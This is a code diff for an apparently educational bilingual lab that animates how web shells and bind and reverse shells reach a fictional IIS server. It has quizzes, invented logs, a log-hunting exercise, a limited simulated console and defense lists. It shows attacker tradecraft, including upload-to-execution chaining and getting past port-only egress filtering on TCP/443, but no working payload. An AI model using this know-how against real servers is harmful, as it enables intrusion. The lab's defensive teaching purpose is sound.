+      what: T('Para usar la web shell el atacante envía una petición HTTPS al script con la instrucción como dato. IIS lo entrega a ASP.NET, el script corre <b>dentro de w3wp.exe</b>, lanza un proceso hijo de vida muy corta para ejecutar la instrucción, recoge su salida y la devuelve como cuerpo de la respuesta. Después el hijo desaparece. Fíjate en la animación: la instrucción se muestra como un marcador <code>&lt;instrucción&gt;</code> porque lo importante aquí es el <b>recorrido</b>, no el contenido.',
+        'To use the web shell the attacker sends an HTTPS request to the script with the instruction as data. IIS hands it to ASP.NET, the script runs <b>inside w3wp.exe</b>, starts a very short-lived child process to carry out the instruction, collects its output and returns it as the response body. Then the child disappears. Watch the animation: the instruction is shown as a placeholder <code>&lt;instruction&gt;</code> because what matters here is the <b>path</b>, not the content.'),
+      why: T('HTTP no tiene memoria: cada petición es independiente. Por eso el directorio actual, las variables de entorno y los programas interactivos <b>no persisten</b> entre una petición y la siguiente, a diferencia de una bind o reverse shell, donde un único cmd.exe vive toda la sesión.', 'HTTP has no memory: each request is independent. That is why the current directory, environment variables and interactive programs <b>do not persist</b> from one request to the next, unlike a bind or reverse shell, where a single cmd.exe lives for the whole session.'),
+      predict: {
+        q: T('Dos peticiones seguidas. En la primera la instrucción cambia de directorio. ¿La segunda arranca en el nuevo directorio?', 'Two requests in a row. In the first, the instruction changes directory. Does the second start in the new directory?'),
+        opts: [T('Sí, el hijo sigue vivo.', 'Yes, the child is still alive.'), T('No: cada petición crea un proceso nuevo con el directorio por defecto de w3wp.exe.', 'No: each request creates a new process with w3wp.exe’s default directory.')],
+        ok: 1,
+        why: T('El primer proceso cambió su directorio… y terminó al responder. El segundo nace desde cero. Es una diferencia de diseño, no una limitación del atacante: se compensa enviando cadenas de instrucciones en una sola petición o, más a menudo, lanzando una reverse shell para tener una sesión de verdad.', 'The first process changed its directory… and ended when it responded. The second is born from scratch. It is a design difference, not an attacker limitation: it is worked around by chaining instructions in a single request or, more often, by launching a reverse shell to get a real session.'),
+      },
+      def: T('El rastro más fiable no está en la red sino en el host: <b>w3wp.exe → cmd.exe</b> (Sysmon evento 1 o evento 4688). Un servidor web que lanza intérpretes de comandos es raro; si lo hace en cada petición a un mismo archivo, es casi seguro una web shell.', 'The most reliable trace is not on the network but on the host: <b>w3wp.exe → cmd.exe</b> (Sysmon event 1 or event 4688). A web server that launches command interpreters is rare; if it does so on every request to one file, it is almost certainly a web shell.'),
+      scene: { conn: { lane: 'http', label: 'HTTPS 443' }, hl: ['w'] },
+      anim: [
+        { pk: 'k>w', lane: 'http', label: T('<instrucción>', '<instruction>') }, { pulse: ['A'] }, { pulse: ['B'] },
+        { set: { rows: { C: { t1: 'cmd.exe /c …', t2: T('proceso efímero (ms)', 'short-lived process (ms)') } } } }, { pulse: ['C'] }, { wait: 350 }, { set: { rows: { C: null } } },
+        { pk: 'w>k', lane: 'http', label: T('200 + salida', '200 + output') },
+        { wait: 400 }, { pk: 'k>w', lane: 'http', label: T('<instrucción 2>', '<instruction 2>') }, { pulse: ['A'] }, { pulse: ['B'] },
+        { set: { rows: { C: { t1: 'cmd.exe /c …', t2: T('otro proceso, desde cero', 'another process, from scratch') } } } }, { pulse: ['C'] }, { wait: 350 }, { set: { rows: { C: null } } },
+        { pk: 'w>k', lane: 'http', label: T('200 + salida', '200 + output') },
+      ],
+      k: [],
+      w: [lg('IIS', IIS_PFX + '15:03:41 10.0.0.20 GET /uploads/img_0412.aspx q=[omitted] 443 - 203.0.113.50 Mozilla/5.0 - 200 0 0 46'), lg('SYSMON', 'EID 1 · Image=C:\\Windows\\System32\\cmd.exe · ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe · User=IIS APPPOOL\\DefaultAppPool'), lg('SYSMON', 'EID 1 · (a second, independent cmd.exe for the next request · same parent · new ProcessId)')],
+    },
+    {
+      title: T('Sin puerto nuevo y sin conexión saliente', 'No new port and no outbound connection'),
+      what: T('Compara con las otras dos: aquí el atacante <b>no abrió ningún puerto, no necesitó salida a Internet y no usó ninguna regla nueva</b>. Todo viaja por el 443 que el firewall ya publica y, con TLS, el contenido es opaco para el firewall. Por eso las web shells son tan persistentes y por eso se defienden mirando el <i>servidor</i> (archivos y procesos) y no sólo el perímetro.',
+        'Compare with the other two: here the attacker <b>opened no port, needed no Internet access and used no new rule</b>. Everything travels over the 443 the firewall already publishes and, with TLS, the content is opaque to the firewall. That is why web shells are so persistent and why they are defended by watching the <i>server</i> (files and processes) and not only the perimeter.'),
+      predict: {
+        q: T('Con la web shell instalada, ¿qué cambia en <code>netstat</code> y en las reglas del firewall?', 'With the web shell installed, what changes in <code>netstat</code> and in the firewall rules?'),
+        opts: [T('Aparece un puerto nuevo en LISTEN.', 'A new port appears in LISTEN.'), T('Aparece una conexión saliente hacia la IP del atacante.', 'An outbound connection to the attacker’s IP appears.'), T('Nada nuevo: sólo conexiones al 443 que ya existía.', 'Nothing new: only connections to the 443 that already existed.')],
+        ok: 2,
+        why: T('El atacante aparece como un visitante más del sitio. La diferencia no está en qué puertos hay abiertos sino en <i>qué hace el servidor</i> cuando le llega esa petición.', 'The attacker shows up as one more visitor of the site. The difference is not in which ports are open but in <i>what the server does</i> when that request arrives.'),
+      },
+      scene: { fwHit: 'in80', hl: ['fw'] },
+      anim: [{ pk: 'k>w', lane: 'http', label: T('<petición>', '<request>') }, { pk: 'w>k', lane: 'http', label: T('<respuesta>', '<response>') }, { pk: 'k>w', lane: 'http', label: T('<petición>', '<request>') }, { pk: 'w>k', lane: 'http', label: T('<respuesta>', '<response>') }],
+      k: [],
+      w: [lg('FW', 'ALLOW tcp 203.0.113.50:50711 → 198.51.100.10:443 · rule IN allow tcp 80,443'), wc('netstat -ano | findstr :443'), ns('web', ':443')],
+    },
+    {
+      title: T('Caza la web shell en los registros', 'Hunt the web shell in the logs'),
+      what: T('Cambia de lado: eres analista del SOC. Estos son eventos reales de un servidor IIS (inventados para el ejercicio). Marca los que consideres <b>sospechosos</b> y comprueba tu criterio. Hay eventos normales a propósito: un buen detector separa señal de ruido.',
+        'Switch sides: you are a SOC analyst. These are events from an IIS server (invented for the exercise). Mark the ones you consider <b>suspicious</b> and check your judgment. Normal events are included on purpose: a good detector separates signal from noise.'),
+      live: 'hunt',
+      scene: { hl: ['w'] }, anim: [], k: [], w: [],
+    },
+    {
+      title: T('Qué te llevas y cómo se defiende', 'Takeaways and defenses'),
+      points: [
+        T('<b>Web shell = el servidor web es el canal.</b> El atacante pide páginas; el servidor ejecuta instrucciones. Sin puertos nuevos y sin conexiones salientes.', '<b>Web shell = the web server is the channel.</b> The attacker requests pages; the server runs instructions. No new ports and no outbound connections.'),
+        T('Es <b>sin estado</b>: una petición, un proceso hijo efímero. Es menos cómoda que una shell interactiva, pero muy discreta.', 'It is <b>stateless</b>: one request, one short-lived child process. Less comfortable than an interactive shell, but very discreet.'),
+        T('Necesita dos fallos encadenados: <b>aceptar</b> un archivo ejecutable y <b>ejecutarlo</b> desde la ruta donde se guardó.', 'It needs two chained flaws: <b>accepting</b> an executable file and <b>executing</b> it from the path where it was stored.'),
+        T('Suele ser la puerta de entrada: desde ahí se prepara una reverse shell para obtener una sesión interactiva (compara en la pestaña Comparar).', 'It is often the entry point: from there a reverse shell is set up to get an interactive session (compare in the Compare tab).'),
+      ],
+      defList: [
+        T('Lista corta de extensiones permitidas, validación del contenido real, renombrado del archivo y tamaño máximo.', 'Short allow-list of extensions, validation of the real content, file renaming and a size limit.'),
+        T('Guardar las subidas fuera de la raíz web, o en una carpeta sin manejadores de scripts (quitar el mapeo de manejadores / permiso de ejecución “None”).', 'Store uploads outside the web root, or in a folder with no script handlers (remove the handler mapping / execute permission “None”).'),
+        T('Pool de aplicaciones con los mínimos privilegios y sin permisos de escritura sobre el código del sitio.', 'App pool with least privilege and no write permission on the site’s code.'),
+        T('FIM sobre la raíz web, Sysmon 11 para .aspx/.ashx/.config nuevos, y alerta para w3wp.exe → cmd.exe / powershell.exe.', 'FIM on the web root, Sysmon 11 for new .aspx/.ashx/.config files, and an alert for w3wp.exe → cmd.exe / powershell.exe.'),
+        T('WAF delante del sitio y filtrado de salida en el servidor para dificultar el salto a una reverse shell.', 'A WAF in front of the site and egress filtering on the server to make the jump to a reverse shell harder.'),
+      ],
+      scene: { hl: [] }, anim: [], k: [], w: [],
+    },
+  ],
+};
+
+/* Hunt exercise: which of these events are suspicious? */
+const HUNT = [
+  { tag: 'IIS', s: IIS_PFX + '14:40:02 10.0.0.20 GET /portal/login.aspx - 443 - 198.51.100.77 Mozilla/5.0 - 200 0 0 24', bad: false,
+    why: T('Navegación normal a una página de la aplicación.', 'Normal browsing to an application page.') },
+  { tag: 'SYSMON', s: 'EID 1 · Image=C:\\Windows\\System32\\inetsrv\\w3wp.exe · ParentImage=C:\\Windows\\System32\\svchost.exe · CommandLine=w3wp.exe -ap "DefaultAppPool"', bad: false,
+    why: T('El arranque normal del pool de aplicaciones: lo lanza el servicio de activación de Windows (svchost.exe).', 'Normal app-pool startup: launched by the Windows activation service (svchost.exe).') },
+  { tag: 'SYSMON', s: 'EID 11 · Image=C:\\Windows\\System32\\inetsrv\\w3wp.exe · TargetFilename=C:\\inetpub\\wwwroot\\uploads\\comprobante_0412.pdf', bad: false,
+    why: T('Una subida legítima: un PDF en la carpeta de subidas. Que w3wp.exe escriba ahí es esperado.', 'A legitimate upload: a PDF in the uploads folder. w3wp.exe writing there is expected.') },
+  { tag: 'SYSMON', s: 'EID 11 · Image=C:\\Windows\\System32\\inetsrv\\w3wp.exe · TargetFilename=C:\\inetpub\\wwwroot\\uploads\\img_0412.aspx', bad: true,
+    why: T('Un script ejecutable (.aspx) en la carpeta de subidas, con nombre que parece una imagen. Los usuarios suben comprobantes, no código.', 'An executable script (.aspx) in the uploads folder, named to look like an image. Users upload receipts, not code.') },
+  { tag: 'IIS', s: IIS_PFX + '15:03:41 10.0.0.20 GET /uploads/img_0412.aspx q=[omitted] 443 - 203.0.113.50 Mozilla/5.0 - 200 0 0 46', bad: true,
+    why: T('Se está <i>pidiendo</i> el script recién subido, con parámetros, desde una IP que no es de ningún usuario conocido. La carpeta de subidas no debería servir páginas dinámicas.', 'The just-uploaded script is being <i>requested</i>, with parameters, from an IP that belongs to no known user. The uploads folder should not serve dynamic pages.') },
+  { tag: 'SYSMON', s: 'EID 1 · Image=C:\\Windows\\System32\\cmd.exe · ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe · User=IIS APPPOOL\\DefaultAppPool', bad: true,
+    why: T('La señal de mayor fidelidad: el proceso del sitio web lanza un intérprete de comandos. En una aplicación normal casi nunca ocurre.', 'The highest-fidelity signal: the website’s process launches a command interpreter. In a normal application it almost never happens.') },
+  { tag: 'IIS', s: IIS_PFX + '15:05:10 10.0.0.20 POST /portal/dashboard.aspx - 443 - 198.51.100.77 Mozilla/5.0 - 200 0 0 63', bad: false,
+    why: T('Una acción normal de un usuario autenticado en el panel del portal.', 'A normal action by an authenticated user on the portal dashboard.') },
+  { tag: 'FW', s: 'ALLOW tcp 10.0.0.20:49801 → updates.acme.example:443 · rule OUT allow any', bad: false,
+    why: T('Una conexión saliente hacia un destino conocido (actualizaciones). Por sí sola no dice nada; importaría hacia una IP desconocida.', 'An outbound connection to a known destination (updates). On its own it says nothing; it would matter toward an unknown IP.') },
+  { tag: 'SYSMON', s: 'EID 1 · Image=C:\\Windows\\System32\\whoami.exe · ParentImage=C:\\Windows\\System32\\cmd.exe · User=IIS APPPOOL\\DefaultAppPool', bad: true,
+    why: T('Reconocimiento posterior: un comando típico de “¿quién soy?” que cuelga de la cadena sospechosa w3wp.exe → cmd.exe.', 'Follow-up reconnaissance: a typical “who am I?” command hanging from the suspicious w3wp.exe → cmd.exe chain.') },
+];
+
+/* ============ Engine: pure logic (no DOM) — scene state folding, simulated Windows console, lab outcome rules ============ */
+let lang = 'es';
+const L = (o) => (o && typeof o === 'object' && !Array.isArray(o) && 'es' in o) ? (o[lang] || o.es) : o;
+const t = (es, en) => (lang === 'es' ? es : en);
+
+/* ---- scene state ---- */
+const BASE_STATE = () => ({ rows: { A: ROW_A }, chips: {}, hl: [], conn: null, fwState: null, fwBlock: false, fwHit: null, openPort: null, egress: 'all', kSock: false, wSock: false, pipe: false });
+function mergeState(base, patch) {
+  const s = Object.assign({}, base, { rows: Object.assign({}, base.rows), chips: Object.assign({}, base.chips) });
+  for (const k of Object.keys(patch || {})) {
+    if (k === 'rows' || k === 'chips') {
+      for (const id of Object.keys(patch[k])) { if (patch[k][id] === null) delete s[k][id]; else s[k][id] = patch[k][id]; }
+    } else s[k] = patch[k];
+  }
+  return s;
+}
+function foldScene(steps, i) {
+  let s = BASE_STATE();
+  for (let n = 0; n <= i; n++) s = mergeState(s, steps[n].scene);
+  return s;
+}
+/* Terminal lines accumulated up to (and including) step i. which = 'k' | 'w' */
+function foldLines(steps, i, which) {
+  const out = [];
+  for (let n = 0; n <= i; n++) for (const l of (steps[n][which] || [])) out.push(l);
+  return out;
+}
+/* Rules shown in the firewall card for a scene state. */
+function fwRules(s) {
+  const r = [{ id: 'in80', dir: 'IN', act: 'allow', txt: 'tcp 80,443 → 10.0.0.20' }];
+  if (s.openPort) r.push({ id: 'in4444', dir: 'IN', act: 'allow', txt: 'tcp ' + s.openPort + ' → 10.0.0.20' });
+  r.push({ id: 'in-deny', dir: 'IN', act: 'deny', txt: 'any (default)' });
+  if (s.egress === 'all') r.push({ id: 'out', dir: 'OUT', act: 'allow', txt: 'any → any (stateful)' });
+  else if (s.egress === 'web') { r.push({ id: 'out', dir: 'OUT', act: 'allow', txt: 'tcp 80,443 → any' }); r.push({ id: 'out-deny', dir: 'OUT', act: 'deny', txt: 'any (default)' }); }
+  else r.push({ id: 'out-deny', dir: 'OUT', act: 'deny', txt: 'any (default)' });
+  return r;
+}
+
+/* ---- simulated Windows console (the fictional ACME-SRV01) ---- */
+const DT = '10/23/2026  02:41 PM', DTF = '10/23/2026  02:55 PM';
+const FS = {
+  'c:\\': { n: 'C:\\', d: ['inetpub', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'Users', 'Windows'], f: [] },
+  'c:\\windows': { n: 'C:\\Windows', d: ['System32', 'SysWOW64', 'Temp'], f: [['explorer.exe', 5766144], ['notepad.exe', 201216]] },
+  'c:\\windows\\temp': { n: 'C:\\Windows\\Temp', d: [], f: [['payload.exe', 73802]] },
+  'c:\\windows\\system32': { n: 'C:\\Windows\\System32', d: ['drivers', 'inetsrv'], f: [['cmd.exe', 323584], ['hostname.exe', 14336], ['ipconfig.exe', 38912], ['netstat.exe', 33280], ['whoami.exe', 70144]] },
+  'c:\\windows\\system32\\inetsrv': { n: 'C:\\Windows\\System32\\inetsrv', d: ['config', 'History'], f: [['appcmd.exe', 214016], ['iisreset.exe', 41984], ['w3wp.exe', 89088]] },
+  'c:\\inetpub': { n: 'C:\\inetpub', d: ['logs', 'wwwroot'], f: [] },
+  'c:\\inetpub\\logs': { n: 'C:\\inetpub\\logs', d: ['LogFiles'], f: [] },
+  'c:\\inetpub\\wwwroot': { n: 'C:\\inetpub\\wwwroot', d: ['portal', 'uploads'], f: [['default.aspx', 2210], ['web.config', 1384]] },
+  'c:\\inetpub\\wwwroot\\portal': { n: 'C:\\inetpub\\wwwroot\\portal', d: [], f: [['dashboard.aspx', 5410], ['login.aspx', 3120], ['upload.aspx', 2874]] },
+  'c:\\inetpub\\wwwroot\\uploads': { n: 'C:\\inetpub\\wwwroot\\uploads', d: [], f: [['comprobante_0412.pdf', 184320], ['factura_2291.pdf', 96411]] },
+  'c:\\users': { n: 'C:\\Users', d: ['Administrator', 'Public'], f: [] },
+};
+const fmt = (n) => n.toLocaleString('en-US');
+function resolvePath(cwd, arg) {
+  let a = arg.trim().replace(/^\/d\s+/i, '').replace(/^"(.*)"$/, '$1').replace(/\//g, '\\');
+  let parts;
+  if (/^[a-z]:/i.test(a)) { parts = a.slice(2).split('\\'); }
+  else if (a.startsWith('\\')) { parts = a.split('\\'); }
+  else { parts = cwd.slice(3).split('\\').filter(Boolean).concat(a.split('\\')); }
+  const stack = [];
+  for (const p of parts) { if (!p || p === '.') continue; if (p === '..') stack.pop(); else stack.push(p); }
+  const key = ('c:\\' + stack.join('\\')).toLowerCase();
+  return FS[key] ? key : null;
+}
+function dirListing(key) {
+  const e = FS[key];
+  const items = [];
+  if (key !== 'c:\\') { items.push({ n: '.', d: true }); items.push({ n: '..', d: true }); }
+  const rest = e.d.map((n) => ({ n, d: true })).concat(e.f.map(([n, z]) => ({ n, d: false, z }))).sort((x, y) => x.n.toLowerCase() < y.n.toLowerCase() ? -1 : 1);
+  const all = items.concat(rest);
+  const lines = [' Volume in drive C has no label.', ' Volume Serial Number is 4A2B-91C3', '', ' Directory of ' + e.n, ''];
+  let bytes = 0, nf = 0, nd = 0;
+  for (const it of all) {
+    if (it.d) { nd++; lines.push(DT + '    <DIR>          ' + it.n); }
+    else { nf++; bytes += it.z; lines.push(DTF + fmt(it.z).padStart(18) + ' ' + it.n); }
+  }
+  const l1 = String(nf).padStart(16) + ' File(s)', l2 = String(nd).padStart(16) + ' Dir(s)';
+  lines.push(l1 + fmt(bytes).padStart(39 - l1.length) + ' bytes');
+  lines.push(l2 + '41,208,455,168'.padStart(39 - l2.length) + ' bytes free');
+  return lines.join('\n');
+}
+const NS_HEAD = ['Active Connections', '', '  Proto  Local Address          Foreign Address        State           PID'];
+const nsRow = (l, f, st, pid) => '  TCP    ' + l.padEnd(23) + f.padEnd(23) + st.padEnd(16) + pid;
+function netstatLines(mode, filter) {
+  const rows = [['0.0.0.0:80', '0.0.0.0:0', 'LISTENING', 4], ['0.0.0.0:135', '0.0.0.0:0', 'LISTENING', 904], ['0.0.0.0:443', '0.0.0.0:0', 'LISTENING', 4], ['0.0.0.0:445', '0.0.0.0:0', 'LISTENING', 4], ['0.0.0.0:3389', '0.0.0.0:0', 'LISTENING', 1204]];
+  if (mode === 'bind-listen') rows.push(['0.0.0.0:4444', '0.0.0.0:0', 'LISTENING', 3120]);
+  rows.push(['0.0.0.0:5985', '0.0.0.0:0', 'LISTENING', 4]);
+  if (mode === 'bind-est') rows.push(['10.0.0.20:4444', '203.0.113.50:51822', 'ESTABLISHED', 3120]);
+  if (mode === 'rev-est') rows.push(['10.0.0.20:49734', '203.0.113.50:4444', 'ESTABLISHED', 3120]);
+  if (mode === 'web') rows.push(['10.0.0.20:443', '203.0.113.50:50711', 'ESTABLISHED', 4]);
+  const body = rows.map((r) => nsRow(r[0], r[1], r[2], r[3]));
+  return filter ? body.filter((l) => l.includes(filter)) : NS_HEAD.concat(body);
+}
+const IPCONFIG = ['', 'Windows IP Configuration', '', '', 'Ethernet adapter Ethernet0:', '',
+  '   Connection-specific DNS Suffix  . : acme.local',
+  '   Link-local IPv6 Address . . . . . : fe80::4c1f:9a2e:7b3d:55a1%6',
+  '   IPv4 Address. . . . . . . . . . . : 10.0.0.20',
+  '   Subnet Mask . . . . . . . . . . . : 255.255.255.0',
+  '   Default Gateway . . . . . . . . . : 10.0.0.1'].join('\n');
+const UNSIM = ['type', 'tasklist', 'systeminfo', 'net', 'set', 'powershell', 'copy', 'del', 'mkdir', 'ping', 'nslookup', 'whoami', 'ipconfig', 'hostname', 'netstat'];
+const SYS = 'C:\\Windows\\System32\\';
+function sysmon1(img, cmdline) {
+  return lg('SYSMON', 'EID 1 · Image=' + SYS + img + ' · CommandLine=' + cmdline + ' · ParentImage=' + SYS + 'cmd.exe · User=' + ID_POOL);
+}
+/* Runs one command line in the simulated cmd.exe. ctx = { phase: 'bind' | 'reverse', cwd }.
+   Returns { out, cwd, exit, events }. Built-in commands (cd, dir, echo, ver) create no process, so they log nothing. */
+function winExec(line, ctx) {
+  const raw = line.trim();
+  const res = { out: '', cwd: ctx.cwd, exit: false, events: [] };
+  if (!raw) return res;
+  const m = raw.match(/^(\S+)\s*(.*)$/);
+  const cmd = m[1].toLowerCase(), arg = m[2];
+  const nsMode = ctx.phase === 'bind' ? 'bind-est' : 'rev-est';
+  switch (cmd) {
+    case 'cd': case 'chdir': {
+      if (!arg) { res.out = ctx.cwd; return res; }
+      const k = resolvePath(ctx.cwd, arg);
+      if (!k) res.out = 'The system cannot find the path specified.'; else res.cwd = FS[k].n;
+      return res;
+    }
+    case 'dir': {
+      const k = arg ? resolvePath(ctx.cwd, arg) : resolvePath(ctx.cwd, '.');
+      res.out = k ? dirListing(k) : 'File Not Found';
+      return res;
+    }
+    case 'echo': res.out = arg ? arg : 'ECHO is on.'; return res;
+    case 'ver': res.out = '\nMicrosoft Windows [Version 10.0.20348.2113]'; return res;
+    case 'exit': res.exit = true; return res;
+    case 'help': res.out = T(
+      '(simulación) Comandos disponibles: whoami, hostname, ipconfig, netstat -ano, ver, cd, dir, echo, exit.\nLos comandos internos (cd, dir, echo, ver) no crean procesos; los demás sí.',
+      '(simulation) Available commands: whoami, hostname, ipconfig, netstat -ano, ver, cd, dir, echo, exit.\nBuilt-ins (cd, dir, echo, ver) create no process; the others do.'); return res;
+    case 'whoami': if (!arg) { res.out = ID_POOL.toLowerCase(); res.events.push(sysmon1('whoami.exe', 'whoami')); return res; } break;
+    case 'hostname': if (!arg) { res.out = 'ACME-SRV01'; res.events.push(sysmon1('hostname.exe', 'hostname')); return res; } break;
+    case 'ipconfig': if (!arg) { res.out = IPCONFIG; res.events.push(sysmon1('ipconfig.exe', 'ipconfig')); return res; } break;
+    case 'netstat': if (/^-ano$/i.test(arg)) { res.out = netstatLines(nsMode, '').join('\n'); res.events.push(sysmon1('netstat.exe', 'netstat -ano')); return res; } break;
+  }
+  if (UNSIM.includes(cmd)) { res.out = T('(simulación) Este comando no está incluido en el laboratorio. Escribe help.', '(simulation) This command is not included in the lab. Type help.'); return res; }
+  res.out = "'" + m[1] + "' is not recognized as an internal or external command,\noperable program or batch file.";
+  return res;
+}
+
+/* ---- lab outcome rules ---- */
+const LAB_DEFAULT = { shell: 'bind', payload: true, inbound: 'none', port: 4444, hostFw: false, egress: 'all', lport: 4444, listener: true, upload: 'none', exec: 'on' };
+/* Evaluates one attempt. Checks are listed in the order a packet/request would meet them; later checks are skipped after the first failure. */
+function labRun(c) {
+  const r = { ok: false, shell: c.shell, checks: [], used: [], att: null, vic: null, fail: null };
+  const push = (id, pass, txt) => r.checks.push({ id, st: pass === null ? 'skip' : pass ? 'pass' : 'fail', txt });
+  const SK = null;
+  if (c.shell === 'bind') {
+    r.used = ['payload', 'port', 'inbound', 'hostFw'];
+    const perim = String(c.port) === c.inbound;
+    push('perim', perim,
+      T('Firewall perimetral: ¿permite la entrada a TCP/' + c.port + '?', 'Perimeter firewall: does it allow inbound TCP/' + c.port + '?'));
+    if (!perim) {
+      push('host', SK, T('Firewall de Windows: ¿hay una regla de entrada para el payload?', 'Windows Firewall: is there an inbound rule for the payload?'));
+      push('listen', SK, T('¿Hay un socket en LISTEN que haga accept()?', 'Is there a socket in LISTEN calling accept()?'));
+      r.fail = 'perim';
+      r.att = T('<code>Connection timed out</code>: el SYN se descartó (DROP) y nadie contestó.', '<code>Connection timed out</code>: the SYN was dropped and nobody answered.');
+      r.vic = T('Nada. En el log del firewall: <code>DENY tcp 203.0.113.50 → :' + c.port + '</code>. El servidor ni se entera.', 'Nothing. In the firewall log: <code>DENY tcp 203.0.113.50 → :' + c.port + '</code>. The server never knows.');
+      r.tip = T('Esto es lo que hace una política de entrada “denegar por defecto”.', 'This is what a “deny by default” inbound policy does.');
+      return r;
+    }
+    push('host', c.hostFw, T('Firewall de Windows: ¿hay una regla de entrada para el payload?', 'Windows Firewall: is there an inbound rule for the payload?'));
+    if (!c.hostFw) {
+      push('listen', SK, T('¿Hay un socket en LISTEN que haga accept()?', 'Is there a socket in LISTEN calling accept()?'));
+      r.fail = 'host';
+      r.att = T('<code>Connection timed out</code>: pasó el perímetro, pero el firewall de Windows descartó el SYN en silencio.', '<code>Connection timed out</code>: it passed the perimeter, but Windows Firewall dropped the SYN silently.');
+      r.vic = T('Nada visible, salvo el evento 5152 (paquete bloqueado) si la auditoría está activa. Desde fuera es idéntico a un bloqueo del perímetro.', 'Nothing visible, except event 5152 (packet blocked) if auditing is on. From outside it is identical to a perimeter block.');
+      r.tip = T('Dos firewalls en serie: el del host es la segunda oportunidad de frenar una bind shell.', 'Two firewalls in series: the host one is the second chance to stop a bind shell.');
+      return r;
+    }
+    push('listen', c.payload, T('¿Hay un socket en LISTEN que haga accept()?', 'Is there a socket in LISTEN calling accept()?'));
+    if (!c.payload) {
+      r.fail = 'listen';
+      r.att = T('<code>Connection refused</code>: el SYN llegó al host y como no había nadie escuchando, el host respondió RST.', '<code>Connection refused</code>: the SYN reached the host and, with nobody listening, the host answered RST.');
+      r.vic = T('Nada, salvo un RST enviado por la pila TCP. El payload no se ejecutó (o ya terminó).', 'Nothing, apart from an RST sent by the TCP stack. The payload did not run (or has already ended).');
+      r.tip = T('“Refused” prueba que llegaste al host: el camino de red está abierto.', '“Refused” proves you reached the host: the network path is open.');
+      return r;
+    }
+    r.ok = true;
+    r.att = T('<code>open</code>: handshake completo y banner de cmd.exe en tu terminal.', '<code>open</code>: full handshake and cmd.exe’s banner in your terminal.');
+    r.vic = T('Puerto en LISTEN → ESTABLISHED en netstat; Sysmon 3 (<code>Initiated=false</code>) y Sysmon 1 (cmd.exe hijo del payload).', 'Port in LISTEN → ESTABLISHED in netstat; Sysmon 3 (<code>Initiated=false</code>) and Sysmon 1 (cmd.exe child of the payload).');
+    r.tip = T('Funciona porque abriste el perímetro <i>y</i> el host. Ambos agujeros son detectables.', 'It works because both the perimeter <i>and</i> the host were opened. Both holes are detectable.');
+    return r;
+  }
+  if (c.shell === 'reverse') {
+    r.used = ['payload', 'egress', 'lport', 'listener'];
+    push('payload', c.payload, T('¿Se ejecutó el payload y llamó a connect()?', 'Did the payload run and call connect()?'));
+    if (!c.payload) {
+      push('egress', SK, T('Firewall perimetral: ¿permite la salida a TCP/' + c.lport + '?', 'Perimeter firewall: does it allow outbound TCP/' + c.lport + '?'));
+      push('listen', SK, T('¿Kali tiene un listener en ese puerto?', 'Does Kali have a listener on that port?'));
+      r.fail = 'payload';
+      r.att = T('Tu listener sigue en <code>listening on [any] ' + c.lport + ' ...</code> para siempre: nada llega.', 'Your listener stays at <code>listening on [any] ' + c.lport + ' ...</code> forever: nothing arrives.');
+      r.vic = T('Nada: sin payload no hay conexión. Primero se necesita ejecución de código.', 'Nothing: without the payload there is no connection. Code execution comes first.');
+      r.tip = T('Una shell es el canal; sin ejecución de código no hay quien lo abra.', 'A shell is the channel; without code execution there is nobody to open it.');
+      return r;
+    }
+    const eg = c.egress === 'all' || (c.egress === 'web' && (c.lport === 80 || c.lport === 443));
+    push('egress', eg, T('Firewall perimetral: ¿permite la salida a TCP/' + c.lport + '?', 'Perimeter firewall: does it allow outbound TCP/' + c.lport + '?'));
+    if (!eg) {
+      push('listen', SK, T('¿Kali tiene un listener en ese puerto?', 'Does Kali have a listener on that port?'));
+      r.fail = 'egress';
+      r.att = T('Nada llega: tu listener espera en silencio.', 'Nothing arrives: your listener waits in silence.');
+      r.vic = T('<code>connect()</code> expira (error 10060): el firewall descartó el SYN saliente. El log del firewall muestra <code>DENY</code> hacia la IP del atacante: una alerta valiosa.', '<code>connect()</code> times out (error 10060): the firewall dropped the outbound SYN. The firewall log shows <code>DENY</code> toward the attacker’s IP: a valuable alert.');
+      r.tip = T('El filtrado de salida convierte un servidor comprometido en uno mudo.', 'Egress filtering turns a compromised server into a mute one.');
+      return r;
+    }
+    push('listen', c.listener, T('¿Kali tiene un listener en ese puerto?', 'Does Kali have a listener on that port?'));
+    if (!c.listener) {
+      r.fail = 'listen';
+      r.att = T('Nada en tu terminal: el RST lo generó la pila TCP de Kali, no hay aplicación que lo muestre.', 'Nothing in your terminal: the RST was generated by Kali’s TCP stack, no application shows it.');
+      r.vic = T('<code>connect()</code> falla al instante (error 10061, conexión rechazada). Ojo: también se ve en Sysmon 3 como intento hacia esa IP.', '<code>connect()</code> fails instantly (error 10061, connection refused). Note it also shows up in Sysmon 3 as an attempt toward that IP.');
+      r.tip = T('El listener debe estar listo <i>antes</i> de ejecutar el payload.', 'The listener must be ready <i>before</i> the payload runs.');
+      return r;
+    }
+    r.ok = true;
+    r.att = T('<code>connect to [203.0.113.50] from (UNKNOWN) [198.51.100.10] …</code> y el banner de cmd.exe.', '<code>connect to [203.0.113.50] from (UNKNOWN) [198.51.100.10] …</code> and cmd.exe’s banner.');
+    r.vic = T('ESTABLISHED saliente con puerto local efímero; Sysmon 3 (<code>Initiated=true</code>); el firewall registra ALLOW + NAT.', 'Outbound ESTABLISHED with an ephemeral local port; Sysmon 3 (<code>Initiated=true</code>); the firewall logs ALLOW + NAT.');
+    r.tip = c.lport === 443 && c.egress === 'web'
+      ? T('Pasó porque el filtro de salida sólo mira el <b>puerto</b>. Para el firewall, TCP/443 saliente “parece web”.', 'It passed because the egress filter only looks at the <b>port</b>. To the firewall, outbound TCP/443 “looks like web”.')
+      : T('Funciona sin tocar ninguna regla de entrada: la asimetría entrada/salida hace el trabajo.', 'It works without touching any inbound rule: the inbound/outbound asymmetry does the job.');
+    return r;
+  }
+  /* web shell */
+  r.used = ['upload', 'exec'];
+  const up = c.upload === 'none';
+  push('upload', up, T('Aplicación: ¿acepta guardar el archivo subido (sin lista de extensiones ni validación de contenido)?', 'Application: does it accept and store the uploaded file (no extension allow-list or content validation)?'));
+  if (!up) {
+    push('exec', SK, T('IIS: ¿ejecuta scripts en la carpeta de subidas?', 'IIS: does it execute scripts in the uploads folder?'));
+    r.fail = 'upload';
+    r.att = T('El portal responde con un error de validación: el archivo no se guardó.', 'The portal answers with a validation error: the file was not stored.');
